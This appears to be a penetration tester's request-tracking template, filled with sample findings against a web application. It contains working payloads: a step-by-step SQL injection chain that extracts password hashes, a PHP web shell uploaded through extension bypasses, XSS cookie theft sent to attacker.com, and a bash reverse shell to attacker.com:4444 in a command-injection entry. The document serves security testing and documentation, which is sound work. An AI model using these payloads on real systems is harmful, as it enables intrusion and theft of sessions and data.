# Web Application Request Tracker

Track all requests, exploitation attempts, and findings during testing. This document serves as your testing log and helps identify patterns in what works vs. what fails.

Related: [[WEB-02-Technical-Testing-Checklist]] | [[WEB-04-Evidence-Collection]] | [[WEB-05-Reporting-Template]]

---

## How to Use This Tracker

1. **Log everything** - successful and failed attempts
2. **Note context** - same payload may work differently in different contexts
3. **Track patterns** - identify what triggers blocks vs. what succeeds
4. **Reference in report** - use IDs to link requests to findings
5. **Build knowledge base** - successful exploits become your arsenal

**Format**: Each entry gets a unique ID: `RT-001`, `RT-002`, etc.

---

## Discovery & Enumeration

| ID | Path/Endpoint | Discovery Method | Response | Notes | Screenshot |
|----|---------------|------------------|----------|-------|------------|
| RT-001 | /admin | Directory fuzzing | 403 Forbidden | Admin panel found | IMG_001 |
| RT-002 | /backup/db.sql | Gobuster | 200 OK | Database backup accessible! | IMG_002 |
| RT-003 | /.git/config | Manual testing | 200 OK | Git repo exposed | IMG_003 |
| RT-004 | | | | | |

### Discovered Paths Summary

**Admin/Management**:
- 

**Sensitive Files**:
- 

**API Endpoints**:
- 

**Upload Locations**:
- 

---

## Authentication Testing

| ID | Attack Type | Payload/Request | Result | Notes | Screenshot |
|----|-------------|-----------------|--------|-------|------------|
| RT-101 | Username enum | admin vs nonexistent | ✅ Different timing | Valid user: 250ms, Invalid: 50ms | IMG_010 |
| RT-102 | Weak password | admin:admin | ❌ Failed | Strong policy enforced | |
| RT-103 | Password reset token | token=user123_1234567890 | ✅ Predictable | Username_timestamp format | IMG_011 |
| RT-104 | | | | | |

### Successful Auth Exploits

**RT-101 Details**:
```
Attack: Username enumeration via timing

Test 1 (Valid user):
POST /login
username=admin&password=wrong
Response time: 250ms
Message: "Invalid credentials"

Test 2 (Invalid user):
POST /login
username=nonexistent&password=wrong
Response time: 50ms
Message: "Invalid credentials"

Finding: Timing difference reveals valid usernames
Severity: Medium
OWASP: A07:2021 (Identification and Authentication Failures)
```

**RT-103 Details**:
```
Attack: Predictable password reset token

Reset request for: testuser
Token: testuser_1640000000

Format: [username]_[unix_timestamp]

Exploit:
- Can predict tokens for other users
- Can generate valid tokens without requesting reset
- No expiration validation

PoC:
import time
token = f"admin_{int(time.time())}"
# Use this token to reset admin password

Severity: High
OWASP: A07:2021
```

---

## Authorization Testing (IDOR/Forced Browsing)

| ID | Endpoint | User A Context | User B ID | Result | Data Exposed | Screenshot |
|----|----------|----------------|-----------|--------|--------------|------------|
| RT-201 | /user/profile?id=100 | User A (id=100) | 101 | ✅ IDOR | Full profile data | IMG_020 |
| RT-202 | /documents/download?file_id=5 | User A | 6 | ✅ IDOR | Downloaded User B's doc | IMG_021 |
| RT-203 | /admin/users | Regular user token | N/A | ✅ Access granted | User list exposed | IMG_022 |
| RT-204 | /api/orders/123 | User A | 124 | ❌ Failed | Proper auth check | |
| RT-205 | | | | | | |

### Critical IDOR Findings

**RT-201 Details**:
```
Endpoint: GET /user/profile?id={id}

User A credentials:
- ID: 100
- Token: abc123...

Request:
GET /user/profile?id=101 HTTP/1.1
Cookie: session=abc123...

Response: 200 OK
{
  "id": 101,
  "username": "victim",
  "email": "victim@example.com",
  "ssn": "123-45-6789",
  "address": "123 Main St"
}

Finding: No authorization check on user ID parameter
Impact: Any authenticated user can view any other user's PII
OWASP: A01:2021 (Broken Access Control)
CVSS: 7.5 (High)
```

**RT-203 Details**:
```
Endpoint: GET /admin/users

As regular user:
GET /admin/users HTTP/1.1
Cookie: session=regular_user_token

Response: 200 OK
[
  {"id": 1, "username": "admin", "email": "admin@company.com", "role": "admin"},
  {"id": 2, "username": "john", "email": "john@company.com", "role": "user"},
  ...
]

Finding: Admin endpoint accessible to regular users
Impact: Vertical privilege escalation, user enumeration
OWASP: A01:2021
CVSS: 8.1 (High)
```

---

## Session Management

| ID | Test Type | Method | Result | Impact | Screenshot |
|----|-----------|--------|--------|--------|------------|
| RT-301 | Cookie flags | Inspect JSESSIONID | ❌ Missing HttpOnly | XSS can steal session | IMG_030 |
| RT-302 | Session fixation | Set session before login | ✅ Same session after login | Session fixation vuln | IMG_031 |
| RT-303 | Token predictability | Burp Sequencer analysis | ❌ High entropy | Strong randomness | |
| RT-304 | Logout validation | Reuse token after logout | ✅ Token still valid | Incomplete logout | IMG_032 |
| RT-305 | | | | | |

### Session Vulnerabilities

**RT-301 Details**:
```
Cookie: JSESSIONID=abc123...
Flags: Secure, SameSite=Lax

Missing: HttpOnly flag

Impact: XSS can steal session token
Exploit:
<script>
document.location='https://attacker.com/steal?cookie='+document.cookie
</script>

Severity: Medium (requires XSS to exploit)
OWASP: A07:2021
```

**RT-304 Details**:
```
Test: Session invalidation on logout

Step 1: Login and save session token
Cookie: session=abc123def456

Step 2: Click logout button
Response: Redirected to /login

Step 3: Reuse old session token
GET /dashboard HTTP/1.1
Cookie: session=abc123def456

Result: 200 OK - Access granted!

Finding: Logout only clears client-side cookie, server-side session remains valid
Impact: Stolen tokens remain valid after logout
Severity: Medium
OWASP: A07:2021
```

---

## SQL Injection

| ID | Endpoint | Parameter | Payload | Result | Evidence | Screenshot |
|----|----------|-----------|---------|--------|----------|------------|
| RT-401 | /search | q | ' OR '1'='1 | ✅ SQLi | Returns all results | IMG_040 |
| RT-402 | /product | id | 1' UNION SELECT NULL,@@version-- | ✅ SQLi | MySQL 5.7.33 | IMG_041 |
| RT-403 | /login | username | admin'-- | ❌ Failed | Input sanitized | |
| RT-404 | /api/users | filter | ' OR SLEEP(5)-- | ✅ Blind SQLi | 5 second delay | IMG_042 |
| RT-405 | | | | | | |

### Confirmed SQL Injection

**RT-401 Details**:
```
Endpoint: GET /search?q={query}

Payload: ' OR '1'='1

Full request:
GET /search?q=%27+OR+%271%27%3D%271 HTTP/1.1

Response: 200 OK
Returned all products including:
- Hidden products
- Deleted products
- Admin-only products

SQL query (inferred):
SELECT * FROM products WHERE name LIKE '%{query}%'

Exploited query:
SELECT * FROM products WHERE name LIKE '%' OR '1'='1%'

Finding: Boolean-based SQL injection
CVSS: 9.8 (Critical)
OWASP: A03:2021 (Injection)
```

**RT-402 Details**:
```
Endpoint: GET /product?id={id}

Exploitation chain:

1. Determine number of columns:
id=1' ORDER BY 1--  (OK)
id=1' ORDER BY 2--  (OK)
id=1' ORDER BY 3--  (OK)
id=1' ORDER BY 4--  (Error)
Result: 3 columns

2. Find injectable column:
id=1' UNION SELECT NULL,NULL,NULL--  (OK)
id=1' UNION SELECT 'a',NULL,NULL--  (Error)
id=1' UNION SELECT NULL,'a',NULL--  (OK)
Result: Column 2 is injectable

3. Extract database version:
id=1' UNION SELECT NULL,@@version,NULL--
Response: "MySQL 5.7.33-0ubuntu0.16.04.1"

4. Extract database names:
id=1' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
Databases found: app_db, mysql, information_schema

5. Extract table names from app_db:
id=1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='app_db'--
Tables: users, products, orders, admin_users

6. Extract columns from users table:
id=1' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
Columns: id, username, email, password, created_at

7. Extract user data:
id=1' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
Extracted credentials (hashes):
admin:$2b$10$abc...
john:$2b$10$def...

Finding: Full database compromise via Union-based SQLi
Severity: Critical
```

---

## Cross-Site Scripting (XSS)

| ID | XSS Type | Location | Payload | Result | Impact | Screenshot |
|----|----------|----------|---------|--------|--------|------------|
| RT-501 | Reflected | /search?q= | <script>alert(1)</script> | ✅ Executed | Session theft possible | IMG_050 |
| RT-502 | Stored | Comment field | <img src=x onerror=alert(1)> | ✅ Executed | Affects all users | IMG_051 |
| RT-503 | DOM-based | /page#hash | <img src=x onerror=alert(1)> | ✅ Executed | Client-side only | IMG_052 |
| RT-504 | Reflected | /profile?name= | <script>alert(1)</script> | ❌ Failed | Encoded output | |
| RT-505 | | | | | | |

### XSS Exploits

**RT-501 Details**:
```
Attack: Reflected XSS in search

URL: /search?q=<script>alert(1)</script>

Request:
GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1

Response HTML:
<div class="search-results">
  You searched for: <script>alert(1)</script>
</div>

Finding: User input reflected without encoding
Impact: Session hijacking, phishing, keylogging

Session theft PoC:
<script>
new Image().src='https://attacker.com/steal?cookie='+document.cookie
</script>

Severity: High
OWASP: A03:2021 (Injection)
```

**RT-502 Details**:
```
Attack: Stored XSS in comments

Endpoint: POST /comment

Request:
POST /comment HTTP/1.1
Content-Type: application/json

{
  "post_id": 123,
  "comment": "<img src=x onerror=alert(1)>"
}

Response: 201 Created

Verification:
GET /post/123
Response HTML contains:
<div class="comment">
  <img src=x onerror=alert(1)>
</div>

Finding: Stored XSS in comment field
Impact: All users viewing this post execute attacker's JavaScript
Persistence: Until comment is deleted

Advanced exploit - Session harvesting:
<img src=x onerror="fetch('https://attacker.com/log',{method:'POST',body:document.cookie})">

Severity: Critical
OWASP: A03:2021
```

---

## File Upload

| ID | Attack Type | Filename/Payload | Result | Impact | Screenshot |
|----|-------------|------------------|--------|--------|------------|
| RT-601 | PHP upload | shell.php | ❌ Failed | Extension blocked | |
| RT-602 | Double extension | shell.php.jpg | ✅ Success | PHP executed | IMG_060 |
| RT-603 | Path traversal | ../../var/www/html/shell.php | ✅ Success | Shell in webroot | IMG_061 |
| RT-604 | .htaccess upload | .htaccess | ✅ Success | All files executable | IMG_062 |
| RT-605 | | | | | |

### File Upload Exploits

**RT-602 Details**:
```
Attack: Double extension bypass

File: shell.php.jpg
Content-Type: image/jpeg
Body:
<?php system($_GET['cmd']); ?>

Upload request:
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------Boundary--

Response: File uploaded to /uploads/shell.php.jpg

Access:
GET /uploads/shell.php.jpg?cmd=whoami

Response:
www-data

Finding: Double extension bypass + server executes .php.jpg as PHP
Impact: Remote code execution
Severity: Critical
OWASP: A04:2021 (Insecure Design)
```

**RT-604 Details**:
```
Attack: .htaccess upload to enable execution

File: .htaccess
Content:
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg

Upload .htaccess:
POST /upload HTTP/1.1
Content-Type: multipart/form-data

[.htaccess content]

Upload shell as .jpg:
POST /upload HTTP/1.1
Content-Type: multipart/form-data

filename="shell.jpg"
<?php system($_GET['cmd']); ?>

Access:
GET /uploads/shell.jpg?cmd=id

Response:
uid=33(www-data) gid=33(www-data)

Finding: .htaccess allows arbitrary file execution
Severity: Critical
```

---

## Business Logic Flaws

| ID | Business Function | Normal Behavior | Exploit | Result | Impact | Screenshot |
|----|------------------|-----------------|---------|--------|--------|------------|
| RT-701 | Checkout flow | Cart â†' Payment â†' Confirm | Skip payment step | ✅ Order confirmed | Free order | IMG_070 |
| RT-702 | Coupon code | SAVE10 = 10% off | Applied 5 times | ✅ 50% off | Price manipulation | IMG_071 |
| RT-703 | Withdrawal | Max $100/day | Negative amount: -$100 | ✅ Added $100 | Infinite money | IMG_072 |
| RT-704 | Inventory | 5 items in stock | Race condition | ✅ Sold 20 items | Oversold | IMG_073 |
| RT-705 | | | | | | |

### Critical Business Logic

**RT-701 Details**:
```
Attack: Payment bypass

Normal flow:
1. POST /cart/add (item_id=100, price=$50)
2. POST /cart/checkout → order_id=12345
3. POST /payment/process (order_id=12345, amount=$50)
4. GET /order/12345/confirm

Exploit: Skip step 3
1. POST /cart/add (item_id=100, price=$50)
2. POST /cart/checkout → order_id=12345
3. [SKIP PAYMENT]
4. GET /order/12345/confirm

Response:
{
  "order_id": 12345,
  "status": "confirmed",
  "total": 50.00,
  "payment_status": "pending"
}

Item shipped without payment!

Finding: No payment validation in order confirmation
Impact: Unlimited free orders
Severity: Critical
OWASP: A04:2021 (Insecure Design)
```

**RT-703 Details**:
```
Attack: Negative withdrawal = deposit

Endpoint: POST /wallet/withdraw

Normal:
{
  "amount": 50.00
}
Response: Balance decreased by $50

Exploit:
{
  "amount": -100.00
}

Response:
{
  "success": true,
  "new_balance": 200.00,
  "message": "Withdrawal successful"
}

Before: $100
Withdrew: -$100
After: $200

Finding: No validation on withdrawal amount sign
Impact: Infinite money generation
Severity: Critical
```

---

## Client-Side Testing

| ID | Vuln Type | Location | Finding | Impact | Screenshot |
|----|-----------|----------|---------|--------|------------|
| RT-801 | DOM XSS | /page#input | location.hash in innerHTML | ✅ XSS | IMG_080 |
| RT-802 | Hardcoded secret | /js/app.js | API key in source | API abuse | IMG_081 |
| RT-803 | Clickjacking | /delete-account | No X-Frame-Options | UI redressing | IMG_082 |
| RT-804 | CORS misconfiguration | /api/userinfo | Wildcard origin + credentials | Data theft | IMG_083 |
| RT-805 | | | | | |

### Client-Side Vulnerabilities

**RT-801 Details**:
```
Finding: DOM-based XSS

JavaScript code (app.js):
var input = location.hash.substring(1);
document.getElementById('output').innerHTML = input;

Exploit:
https://target.com/page#<img src=x onerror=alert(document.cookie)>

Flow:
1. URL hash: #<img src=x onerror=alert(document.cookie)>
2. JavaScript extracts: <img src=x onerror=alert(document.cookie)>
3. Inserted via innerHTML (unsafe)
4. Image loads, onerror fires, cookie stolen

Severity: High
OWASP: A03:2021
```

**RT-802 Details**:
```
Finding: Hardcoded API key

File: /js/app.js (line 147)

const API_KEY = "AIzaSyDPK8h9xQz1234567890abcdefghijklmno";

fetch('https://api.thirdparty.com/data', {
  headers: {
    'Authorization': `Bearer ${API_KEY}`
  }
});

Impact: Anyone can use this API key
- Access third-party services
- Incur charges on company account
- Abuse rate limits

Severity: High
```

---

## Additional Injection Attacks

| ID | Injection Type | Location | Payload | Result | Screenshot |
|----|----------------|----------|---------|--------|------------|
| RT-901 | Command injection | /ping endpoint | 127.0.0.1; whoami | ✅ Executed | IMG_090 |
| RT-902 | XXE | /upload (XML) | <!ENTITY xxe SYSTEM "file:///etc/passwd"> | ✅ File read | IMG_091 |
| RT-903 | LDAP injection | /ldap/search | *)(uid=*))(|(uid=* | ✅ Auth bypass | IMG_092 |
| RT-904 | Template injection | /render?name= | {{7*7}} | ✅ SSTI (49 returned) | IMG_093 |
| RT-905 | Path traversal | /download?file= | ../../etc/passwd | ✅ File read | IMG_094 |
| RT-906 | | | | | |

### Command Injection

**RT-901 Details**:
```
Endpoint: POST /ping

Intended use:
{
  "host": "8.8.8.8"
}

Server executes: ping -c 4 8.8.8.8

Exploit:
{
  "host": "8.8.8.8; whoami"
}

Server executes: ping -c 4 8.8.8.8; whoami

Response:
{
  "output": "PING 8.8.8.8...\nwww-data\n"
}

Advanced exploit - Reverse shell:
{
  "host": "8.8.8.8; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
}

Finding: Command injection via unsanitized host parameter
Severity: Critical
OWASP: A03:2021
```

---

## Exploit Chains

Document multi-step attacks:

### Chain 1: IDOR → XSS → Session Hijacking

| Step | Action | RT Reference | Result |
|------|--------|--------------|--------|
| 1 | IDOR to access admin profile | RT-203 | Got admin user data |
| 2 | Found admin posts comment section | Manual | Identified stored XSS |
| 3 | Inject XSS payload in comment | RT-502 | XSS stored |
| 4 | Admin views post | N/A | JavaScript executes |
| 5 | Session cookie exfiltrated | RT-502 | Admin session stolen |

**Chain Details**:
```
Objective: Steal admin session

Step 1 (IDOR): Access /admin/users as regular user
- Retrieved list of admin users
- Found admin ID: 1

Step 2 (Recon): Browse as admin would
- Found admin frequently reviews user comments
- Comments section vulnerable to XSS

Step 3 (Stored XSS): Post malicious comment
POST /comment
{
  "comment": "<img src=x onerror=\"fetch('https://attacker.com/steal',{method:'POST',body:document.cookie})\">"
}

Step 4: Wait for admin to view comment
- Admin logs in
- Admin views comments page
- JavaScript executes in admin's browser

Step 5: Receive admin session
- Webhook receives: session=admin_abc123...
- Use session to access admin panel

Total time: 2 hours (waiting for admin)
Overall severity: Critical
```

---

## Pattern Analysis

### What Works

**Authentication**:
- Timing attacks for username enumeration
- Predictable password reset tokens
- Missing logout invalidation

**Authorization**:
- Sequential ID parameters are almost always vulnerable
- Admin endpoints often lack proper access control
- IDOR in GET and DELETE methods

**Injection**:
- Search fields commonly vulnerable to SQLi
- Comment fields often vulnerable to XSS
- Ping/diagnostic tools vulnerable to command injection

**File Upload**:
- Double extensions bypass filters
- .htaccess enables arbitrary execution
- Path traversal in filenames

### What Fails

**Well-Protected**:
- Login forms with strong rate limiting
- Modern frameworks with auto-escaping
- WAF-protected admin panels
- Parameterized queries (no SQLi)

### Application Characteristics

**Technology Stack**:
- PHP 7.4 (detected via headers)
- MySQL 5.7 (extracted via SQLi)
- Apache 2.4 (detected via Nikto)
- jQuery 3.5 (detected via source)

**Security Controls**:
- Weak input validation (many injection vulns)
- Missing authorization checks (IDOR everywhere)
- No HttpOnly on session cookies
- No X-Frame-Options (clickjacking)
- Some SQL injection mitigation (parameterized queries in some places)

---

## Quick Stats

**Total Requests Tested**: ___
**Successful Exploits**: ___
**Success Rate**: ___%

**By Category**:
- Authentication: __ tested, __ successful
- Authorization: __ tested, __ successful  
- SQL Injection: __ tested, __ successful
- XSS: __ tested, __ successful
- File Upload: __ tested, __ successful
- Business Logic: __ tested, __ successful
- Command Injection: __ tested, __ successful

**Severity Breakdown**:
- Critical: __
- High: __
- Medium: __
- Low: __
- Info: __

---

## OWASP Top 10 Coverage

| OWASP Category | Tested | Findings | Max Severity |
|----------------|--------|----------|--------------|
| A01: Broken Access Control | ✅ | RT-201, RT-202, RT-203 | Critical |
| A02: Cryptographic Failures | ✅ | (none found) | N/A |
| A03: Injection | ✅ | RT-401, RT-501, RT-901 | Critical |
| A04: Insecure Design | ✅ | RT-701, RT-703 | Critical |
| A05: Security Misconfiguration | ✅ | RT-001, RT-802 | High |
| A06: Vulnerable Components | ⏸️ | (requires version analysis) | TBD |
| A07: Auth Failures | ✅ | RT-101, RT-103, RT-304 | High |
| A08: Data Integrity Failures | ⏸️ | (no serialization found) | N/A |
| A09: Logging Failures | ⏸️ | (requires client input) | N/A |
| A10: SSRF | ✅ | (none found) | N/A |

---

## Burp Project Details

**Project Name**: ClientName_WebApp_2026-01-22.burp

**Site Map Summary**:
- Total requests: ___
- In-scope hosts: ___
- Identified parameters: ___

**Interesting Findings Flagged**:
- (Use Burp's color coding to mark critical requests)

---

## Notes & Observations

### Tester Notes
- Application appears to be custom-built (not a known CMS)
- Minimal security controls implemented
- Many basic vulnerabilities present
- Likely developed by small team without security expertise

### Time Log

| Date | Time Spent | Phase | Notes |
|------|-----------|-------|-------|
| 2026-01-22 | 1h | Recon + Discovery | Found exposed Git repo |
| 2026-01-22 | 2h | Auth + Session testing | Username enum, weak reset tokens |
| 2026-01-22 | 3h | IDOR testing | Critical findings on all user-specific endpoints |
| 2026-01-22 | 2h | SQL injection | Union-based SQLi, extracted database |
| 2026-01-22 | 1h | XSS testing | Reflected and stored XSS confirmed |
| | | | |

---

## Tags
#request-tracking #testing-log #evidence #web-testing #owasp

---

## Related Documents
- [[WEB-00-Overview|Overview]]
- [[WEB-02-Technical-Testing-Checklist|Technical Testing Checklist]]
- [[WEB-04-Evidence-Collection|Evidence Collection]]
- [[WEB-05-Reporting-Template|Reporting Template]]
- [[WEB-06-Quick-Reference|Quick Reference]]

---
*Created: 2026-01-22*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
